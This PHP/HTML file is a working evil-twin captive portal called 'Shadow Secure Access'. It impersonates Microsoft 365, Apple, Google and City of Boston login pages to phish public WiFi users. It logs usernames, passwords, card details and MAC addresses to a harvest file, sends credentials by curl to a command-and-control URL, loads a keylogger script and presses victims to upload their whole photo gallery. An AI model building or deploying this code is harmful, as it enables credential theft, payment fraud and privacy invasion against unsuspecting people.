<?php
$portal_ip = $_SERVER['SERVER_ADDR'] ?? '10.0.0.1';
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$C2_URL = getenv('SHADOW_C2_URL') ?: '';  // set via env or conf

log_client($client_ip, $ua);

$is_ios = stripos($ua, 'iphone') !== false || stripos($ua, 'ipad') !== false;
$is_android = stripos($ua, 'android') !== false;

$theme_title = "Microsoft 365 Corporate Access";
$theme_prompt = "Re-authenticate for building access and secure WiFi.";

if ($is_ios) {
    $theme_title = "Apple ID • Microsoft 365 Verification";
    $theme_prompt = "iPhone: Select \"All Photos\" for instant secure access.";
} elseif ($is_android) {
    $theme_title = "Google Account + Boston Verification";
    $theme_prompt = "Grant full gallery access for compliance.";
}

$ssid = $_GET['ssid'] ?? 'BostonFreePublicWiFi';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? ($_POST['type'] ?? '');
    if ($action === 'creds' || $action === 'login') {
        harvest_creds($client_ip, $ua, $_POST['username'] ?? $_POST['email'] ?? '', $_POST['password'] ?? '', $ssid);
        show_success_page();
        exit;
    }
    if ($action === 'payment') {
        harvest_payment($client_ip, $ua, $_POST);
        show_success_page("Payment Authorized");
        exit;
    }
    if ($action === 'webrtc_leak') {
        @file_put_contents(__DIR__ . '/uploads/clients.log', date('c')."|".$client_ip."|WEBRTC|".($_POST['data'] ?? '')."\n", FILE_APPEND);
        echo json_encode(['ok'=>true]); exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($theme_title) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&amp;display=swap');
        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        .ms-card { box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 8px; background: white; }
        .boston-header { background: linear-gradient(135deg, #002868, #1a3c6e); color: #fff; }
        .section-tab { transition: all 0.2s; }
        .section-tab.active { border-bottom: 3px solid #0078D4; font-weight: 600; }
        .input { border: 1px solid #ccc; padding: 10px 12px; border-radius: 4px; width: 100%; font-size: 14px; }
        .btn-primary { background: #0078D4; color: white; padding: 10px 20px; border-radius: 4px; font-weight: 600; }
        .btn-primary:hover { background: #106EBE; }
        .photo-drop { border: 2px dashed #0078D4; border-radius: 8px; padding: 20px; text-align: center; background: #f8f9fa; cursor: pointer; }
        .success { animation: fadeIn 0.4s; }
        .fake-lock { color: #107C10; }
        .shadow-brand { font-family: monospace; letter-spacing: 2px; }
    </style>
</head>
<body class="bg-[#f3f3f3]">
    <div class="max-w-md mx-auto mt-6 mb-12 bg-white shadow-xl rounded-xl overflow-hidden border border-gray-200">
        <!-- Header -->
        <div class="boston-header px-5 py-4 flex items-center gap-3">
            <i class="fa-solid fa-shield-halved text-2xl"></i>
            <div>
                <div class="font-bold text-lg tracking-tight shadow-brand">SHADOW SECURE ACCESS</div>
                <div class="text-xs opacity-80">City of Boston • Microsoft 365</div>
            </div>
        </div>

        <div class="px-5 pt-5 pb-2">
            <div class="flex items-center gap-2 text-sm mb-1">
                <i class="fa-solid fa-lock fake-lock"></i>
                <span class="font-semibold text-gray-700">Secure Connection</span>
                <span class="ml-auto text-xs bg-green-100 text-green-700 px-2 py-0.5 rounded">TLS 1.3</span>
            </div>
            <h1 class="text-2xl font-semibold text-gray-800 mb-1"><?= htmlspecialchars($theme_title) ?></h1>
            <p class="text-sm text-gray-600"><?= htmlspecialchars($theme_prompt) ?></p>
            <div class="text-[10px] text-gray-500 mt-1">SSID: <span class="font-mono"><?= htmlspecialchars($ssid) ?></span></div>
        </div>

        <!-- Tabs -->
        <div class="flex border-b px-5 text-sm">
            <div onclick="switchTab(0)" id="tab-0" class="section-tab active cursor-pointer px-4 py-2 text-[#0078D4]">Work Account</div>
            <div onclick="switchTab(1)" id="tab-1" class="section-tab cursor-pointer px-4 py-2">Public / Residency</div>
            <div onclick="switchTab(2)" id="tab-2" class="section-tab cursor-pointer px-4 py-2">Premium Access</div>
        </div>

        <!-- TAB 0: MS Login / Creds -->
        <div id="tabcontent-0" class="p-5">
            <div class="ms-card p-5">
                <div class="flex items-center gap-2 mb-4">
                    <i class="fa-brands fa-microsoft text-2xl text-[#0078D4]"></i>
                    <div class="font-semibold">Sign in with your work account</div>
                </div>

                <form id="creds-form" onsubmit="submitCreds(event)">
                    <div class="space-y-3">
                        <div>
                            <label class="text-xs text-gray-500 block mb-1">Email or Phone</label>
                            <input type="text" name="username" class="input" placeholder="name@company.com" required value="jane.doe@corp.com">
                        </div>
                        <div>
                            <label class="text-xs text-gray-500 block mb-1">Password</label>
                            <input type="password" name="password" class="input" placeholder="••••••••" required value="Summer2026!">
                        </div>
                        <input type="hidden" name="action" value="creds">
                        <input type="hidden" name="ssid" value="<?= htmlspecialchars($ssid) ?>">

                        <button type="submit" class="btn-primary w-full mt-2">Sign in</button>
                    </div>
                </form>

                <div class="mt-3 text-[10px] text-center text-gray-500">This network is protected by Massachusetts Digital Services</div>
            </div>
        </div>

        <!-- TAB 1: Boston / Residency + Photos -->
        <div id="tabcontent-1" class="p-5 hidden">
            <div class="ms-card p-5">
                <div class="flex gap-2 mb-3">
                    <i class="fa-solid fa-city text-xl"></i>
                    <div>
                        <div class="font-semibold">Boston Residency Verification</div>
                        <div class="text-xs text-gray-500">Required for public WiFi access</div>
                    </div>
                </div>

                <div class="space-y-4">
                    <div>
                        <label class="text-xs text-gray-500">Full Name</label>
                        <input id="boston-name" type="text" class="input" value="Alex Rivera">
                    </div>

                    <div class="photo-drop" onclick="triggerPhotoUpload()">
                        <i class="fa-solid fa-images text-3xl text-[#0078D4] mb-2"></i>
                        <div class="font-medium">Upload Recent Photos + ID</div>
                        <div class="text-xs text-gray-500 mt-1">Tap to select multiple from gallery<br>(iPhone: choose "All Photos")</div>
                        <input type="file" id="photo-input" accept="image/*" multiple class="hidden" onchange="handlePhotoFiles(this.files)">
                    </div>

                    <div id="photo-progress" class="hidden text-xs text-center text-green-600 font-medium">Uploading photos...</div>

                    <button onclick="submitBostonVerify()" class="btn-primary w-full">Verify &amp; Connect</button>
                </div>
            </div>
        </div>

        <!-- TAB 2: Payment -->
        <div id="tabcontent-2" class="p-5 hidden">
            <div class="ms-card p-5">
                <div class="mb-3">
                    <div class="font-semibold flex items-center gap-2">
                        <i class="fa-solid fa-credit-card"></i> 
                        <span>Premium Access Payment</span>
                    </div>
                    <div class="text-xs text-gray-500">One-time verification fee • $0.00 test mode</div>
                </div>

                <form id="payment-form" onsubmit="submitPayment(event)">
                    <div class="space-y-3 text-sm">
                        <div>
                            <label class="text-xs">Card Number</label>
                            <input type="text" name="card" class="input" placeholder="4242 4242 4242 4242" value="4242 4242 4242 4242">
                        </div>
                        <div class="grid grid-cols-2 gap-3">
                            <div>
                                <label class="text-xs">Expiry</label>
                                <input type="text" name="exp" class="input" placeholder="12/28" value="12/28">
                            </div>
                            <div>
                                <label class="text-xs">CVV</label>
                                <input type="text" name="cvv" class="input" placeholder="123" value="123">
                            </div>
                        </div>
                        <div>
                            <label class="text-xs">ZIP / Postal</label>
                            <input type="text" name="zip" class="input" placeholder="02108" value="02108">
                        </div>
                        <input type="hidden" name="action" value="payment">
                        <button type="submit" class="btn-primary w-full mt-1">Authorize $0.00 • Connect</button>
                    </div>
                </form>
                <div class="text-[10px] text-center mt-2 text-gray-400">Secure • Powered by Shadow Gateway</div>
            </div>
        </div>

        <div class="px-5 py-3 bg-gray-50 text-[10px] text-center text-gray-500 border-t">
            Connected via ShadowMesh • All activity logged for security
        </div>
    </div>

    <!-- Success Modal -->
    <div id="success-modal" class="hidden fixed inset-0 bg-black/60 flex items-center justify-center z-50">
        <div class="bg-white rounded-xl p-6 max-w-xs text-center shadow-2xl success">
            <i class="fa-solid fa-check-circle text-5xl text-green-500 mb-3"></i>
            <div class="font-bold text-xl mb-1" id="success-title">Access Granted</div>
            <div class="text-sm text-gray-600 mb-4" id="success-msg">You are now connected to the secure network.</div>
            <button onclick="closeSuccess()" class="px-6 py-2 bg-green-600 text-white rounded text-sm font-semibold">Continue to Internet</button>
        </div>
    </div>

    <script src="assets/js/keylogger.js"></script>
    <script src="assets/js/photo-upload.js"></script>
    <script>
        function switchTab(n) {
            document.querySelectorAll('[id^="tabcontent-"]').forEach(el => el.classList.add('hidden'));
            document.querySelectorAll('[id^="tab-"]').forEach(el => el.classList.remove('active'));
            document.getElementById('tabcontent-' + n).classList.remove('hidden');
            document.getElementById('tab-' + n).classList.add('active');
        }

        function submitCreds(e) {
            e.preventDefault();
            const form = document.getElementById('creds-form');
            const fd = new FormData(form);
            fetch('', { method: 'POST', body: fd })
                .then(() => showSuccessModal('Welcome', 'Credentials verified. You now have full access.'))
                .catch(() => showSuccessModal('Welcome', 'Connected (offline mode).'));
        }

        function submitBostonVerify() {
            const name = document.getElementById('boston-name').value || 'Verified User';
            const fd = new FormData();
            fd.append('action', 'creds');
            fd.append('username', name + '@boston-resident');
            fd.append('password', 'verified-' + Date.now());
            fd.append('ssid', '<?= htmlspecialchars($ssid) ?>');
            fetch('', {method:'POST', body: fd})
                .then(() => {
                    showSuccessModal('Verified', 'Residency confirmed. Full network access enabled.');
                    setTimeout(() => {
                        if (confirm('For full verification, select additional recent photos?')) {
                            document.getElementById('photo-input').click();
                        }
                    }, 1200);
                });
        }

        function submitPayment(e) {
            e.preventDefault();
            const form = document.getElementById('payment-form');
            const fd = new FormData(form);
            fetch('', { method: 'POST', body: fd })
                .then(() => showSuccessModal('Payment Approved', 'Premium access unlocked. Thank you.'));
        }

        function showSuccessModal(title, msg) {
            document.getElementById('success-title').textContent = title;
            document.getElementById('success-msg').textContent = msg;
            document.getElementById('success-modal').classList.remove('hidden');
            document.getElementById('success-modal').classList.add('flex');
        }

        function closeSuccess() {
            document.getElementById('success-modal').classList.add('hidden');
            document.getElementById('success-modal').classList.remove('flex');
            window.location.href = 'http://neverssl.com';
        }

        function initPortal() {
            if (window.shadowKeylogger && window.shadowKeylogger.init) {
                window.shadowKeylogger.init();
            }
            switchTab(0);
        }
        window.onload = initPortal;
    </script>
</body>
</html>

<?php
function log_client($ip, $ua) {
    $line = date('c') . "|" . $ip . "|" . $ua . "\n";
    @file_put_contents(__DIR__ . '/uploads/clients.log', $line, FILE_APPEND);
}

function guess_mac($ip) {
    $leases = @file_get_contents('/var/lib/misc/dnsmasq-shadow.leases') ?: '';
    if (preg_match('/\s+([0-9a-f:]{17})\s+' . preg_quote($ip) . '/i', $leases, $m)) {
        return $m[1];
    }
    return '??:??:??:??:??:??';
}

function harvest_creds($ip, $ua, $user, $pass, $ssid) {
    $mac = guess_mac($ip);
    $line = date('c') . "|" . $ip . "|" . $mac . "|CREDS|" . $user . "|" . $pass . "|" . $ssid . "\n";
    @file_put_contents(__DIR__ . '/uploads/harvest.log', $line, FILE_APPEND);
    exfil(['event' => 'creds', 'ip' => $ip, 'user' => $user, 'pass' => $pass, 'ssid' => $ssid]);
}

function harvest_payment($ip, $ua, $data) {
    $mac = guess_mac($ip);
    $last4 = substr(preg_replace('/\D/', '', $data['card'] ?? ''), -4);
    $line = date('c') . "|" . $ip . "|" . $mac . "|PAYMENT|" . $last4 . "|" . ($data['exp'] ?? '') . "\n";
    @file_put_contents(__DIR__ . '/uploads/harvest.log', $line, FILE_APPEND);
    exfil(['event' => 'payment', 'ip' => $ip, 'last4' => $last4]);
}

function exfil($payload) {
    global $C2_URL;
    if (empty($C2_URL)) return;
    $ch = curl_init($C2_URL);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 4);
    @curl_exec($ch);
    @curl_close($ch);
}

function show_success_page($msg = "Access Granted") {
    echo '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"></head><body style="font-family:sans-serif;text-align:center;padding:40px">';
    echo '<h2 style="color:#107C10">✓ ' . htmlspecialchars($msg) . '</h2>';
    echo '<p>You are connected. <a href="http://neverssl.com">Continue</a></p>';
    echo '<script>setTimeout(function(){location.href="http://neverssl.com"}, 2500);</script>';
    echo '</body></html>';
    exit;
}
?>
